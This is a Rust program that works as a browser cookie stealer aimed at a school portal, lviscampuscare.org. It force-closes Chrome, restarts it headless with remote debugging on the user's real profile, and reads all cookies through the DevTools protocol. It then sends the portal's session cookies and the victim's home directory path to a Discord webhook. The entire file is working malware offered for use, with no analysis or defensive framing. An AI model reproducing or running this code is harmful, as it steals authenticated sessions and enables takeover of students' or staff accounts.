use dirs::home_dir;
use dotenv::dotenv;
use futures_util::{SinkExt, StreamExt};
use serde::{Deserialize, Serialize};
use serde_json::json;
use serde_json::Value;
use std::process::{Command, Stdio};
use std::{env, fs};
use tokio_tungstenite::{connect_async, tungstenite};
use webhook::client::WebhookClient;

// const OS: &str = env::consts::OS;
const DEBUG_PORT: u32 = 9222;
const CHROME_PATH: &str = r#"C:\Program Files\Google\Chrome\Application\chrome.exe"#; // Update with your Chrome path
const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;

#[derive(Debug, Serialize, Deserialize)]
struct Cookie {
    name: String,
    value: String,
    domain: String,
    path: String,
    expires: Option<f64>,
    size: u32,
    httpOnly: bool,
    secure: bool,
    session: bool,
    sameSite: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct ResultData {
    cookies: Vec<Cookie>,
}

#[derive(Debug, Serialize, Deserialize)]
struct Root {
    id: u32,
    result: ResultData,
}

#[tokio::main]
pub async fn main() -> Result<(), reqwest::Error> {
    dotenv().ok();
    let discord_webhook_url =
        std::env::var("DISCORD_WEBHOOK_URL").expect("DISCORD_WEBHOOK_URL must be set.");
    kill_chrome();
    let localappdata = env::var("LOCALAPPDATA").unwrap();
    let user_data_dir = localappdata.clone() + USER_DATA_DIR;
    let local_state = fs::read_to_string(format!("{user_data_dir}\\Local State")).unwrap();
    let v: Value = serde_json::from_str(&local_state).unwrap();
    start_debugged_chrome(localappdata.clone() + USER_DATA_DIR);
    let url = get_debug_ws_url().await;

    dbg!("{}", &url);
    let (ws_stream, _) = connect_async(url).await.unwrap();
    println!("Connected to WebSocket!");
    let (mut sink, mut stream) = ws_stream.split();
    sink.send(tungstenite::Message::text(
        json!({
        "id": 1,
        "method": "Page.navigate",
            "params": {
            "url": "https://lviscampuscare.org"
        }
        })
        .to_string(),
    ))
    .await
    .expect("Failed to navigate");
    stream.next();
    sink.send(tungstenite::Message::text(
        json!({
            "id": 2,
            "method": "Storage.getCookies"
        })
        .to_string(),
    ))
    .await
    .expect("ln 52");

    if let Some(response) = stream.next().await {
        match response {
            Ok(msg) => {
                let msg_text = msg.to_text().unwrap();
                let msg_json: Root =
                    serde_json::from_str(&msg_text).expect("Error parsing into JSON");
                let lvis_cookies = msg_json
                    .result
                    .cookies
                    .iter()
                    .filter(|cookie| cookie.domain.contains("lvis"));
                let client: WebhookClient = WebhookClient::new(&discord_webhook_url);
                let _ = client
                    .send(|msg| {
                        msg.content(home_dir().expect("err getting homedir").to_str().unwrap())
                    })
                    .await;
                for cookie in lvis_cookies {
                    client
                        .send(|msg| msg.content(&format!("{} : {}", cookie.name, &cookie.value)))
                        .await
                        .unwrap();
                }
            }
            Err(e) => eprintln!("Error receiving message: {:?}", e),
        }

        kill_chrome();
    }
    Ok(())
}

async fn get_debug_ws_url() -> String {
    let body = reqwest::get(format!("http://localhost:{DEBUG_PORT}/json"))
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    dbg!("\n\n{:#?}\n", &body);
    let json_res: Value = serde_json::from_str(&body).unwrap();
    let websocket_debugger_url = json_res[0]["webSocketDebuggerUrl"]
        .as_str()
        .unwrap()
        .to_string();
    println!("{}", websocket_debugger_url);
    websocket_debugger_url
}

fn kill_chrome() {
    let output = Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        eprintln!("Failed to kill Chrome: {:?}", output.status);
    }
}

fn start_debugged_chrome(user_data_dir: String) {
    let localappdata = env::var("LOCALAPPDATA").unwrap();
    let mut child = Command::new(CHROME_PATH)
        .args(&[
            &format!("--remote-debugging-port={}", DEBUG_PORT),
            "--headless",
            "--remote-allow-origins=*",
            "--disable-gpu",
            &format!("--user-data-dir={}", localappdata + USER_DATA_DIR),
            "https://lviscampuscare.org",
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start Chrome");

    println!("Chrome started with PID: {}", child.id());
}
